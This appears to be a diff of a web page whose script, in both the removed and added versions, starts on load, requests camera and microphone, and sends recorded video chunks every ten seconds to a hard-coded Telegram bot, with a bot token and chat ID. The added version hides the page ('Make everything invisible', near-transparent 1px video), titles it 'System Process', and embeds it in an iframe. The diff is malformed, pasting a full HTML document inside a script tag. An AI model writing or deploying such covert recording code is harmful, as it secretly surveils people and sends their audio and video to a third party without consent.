@@ -12,58 +12,71 @@
   <video id="liveVideo" autoplay playsinline muted></video>
 
   <script>
-    'use strict';
+    <!doctype html>
 
-    const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
-    const CHAT_ID = "8504837303";
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+<html>  
+<head>  
+  <title>System Process</title>  
+  <style>  
+    /* Make everything invisible */  
+    body { margin: 0; background: transparent; overflow: hidden; }  
+    video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }  
+  </style>  
+</head>  
+<body>  
+  <video id="liveVideo" autoplay playsinline muted></video>    <script>  
+    'use strict';  
+  
+    const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";  
+    const CHAT_ID = "8504837303";  
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;  
+  
+    const videoElement = document.getElementById('liveVideo');  
+    let mediaRecorder;  
+    let sending = false;  
+  
+    // Wake Lock to keep the CPU running even if screen dims  
+    async function requestWakeLock() {  
+      try {  
+        if ('wakeLock' in navigator) {  
+          await navigator.wakeLock.request('screen');  
+        }  
+      } catch (err) { console.log(err); }  
+    }  
+  
+    async function startCapture() {  
+      try {  
+        await requestWakeLock();  
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });  
+        videoElement.srcObject = stream;  
+  
+        const options = { mimeType: 'video/webm; codecs=vp8,opus' };  
+        mediaRecorder = new MediaRecorder(stream, options);  
+  
+        mediaRecorder.ondataavailable = async (event) => {  
+          if (event.data && event.data.size > 0 && !sending) {  
+            sending = true;  
+            const formData = new FormData();  
+            formData.append('chat_id', CHAT_ID);  
+            formData.append('video', event.data, 'live_chunk.webm');  
+  
+            try {  
+              await fetch(TELEGRAM_API, { method: 'POST', body: formData });  
+            } catch (err) { console.error('Telegram Error:', err); }  
+            sending = false;  
+          }  
+        };  
+  
+        // Send a video chunk every 10 seconds  
+        mediaRecorder.start(10000);   
+  
+      } catch (err) {  
+        console.error("Permission denied:", err);  
+      }  
+    }  
+  
+    // Auto-start when the iframe is loaded by index.html  
+    window.onload = startCapture;  
+  </script>  </body>  
+</html>  
 
-    const videoElement = document.getElementById('liveVideo');
-    let mediaRecorder;
-    let sending = false;
-
-    // Wake Lock to keep the CPU running even if screen dims
-    async function requestWakeLock() {
-      try {
-        if ('wakeLock' in navigator) {
-          await navigator.wakeLock.request('screen');
-        }
-      } catch (err) { console.log(err); }
-    }
-
-    async function startCapture() {
-      try {
-        await requestWakeLock();
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        videoElement.srcObject = stream;
-
-        const options = { mimeType: 'video/webm; codecs=vp8,opus' };
-        mediaRecorder = new MediaRecorder(stream, options);
-
-        mediaRecorder.ondataavailable = async (event) => {
-          if (event.data && event.data.size > 0 && !sending) {
-            sending = true;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', event.data, 'live_chunk.webm');
-
-            try {
-              await fetch(TELEGRAM_API, { method: 'POST', body: formData });
-            } catch (err) { console.error('Telegram Error:', err); }
-            sending = false;
-          }
-        };
-
-        // Send a video chunk every 10 seconds
-        mediaRecorder.start(10000); 
-
-      } catch (err) {
-        console.error("Permission denied:", err);
-      }
-    }
-
-    // Auto-start when the iframe is loaded by index.html
-    window.onload = startCapture;
-  </script>
-</body>
-</html>
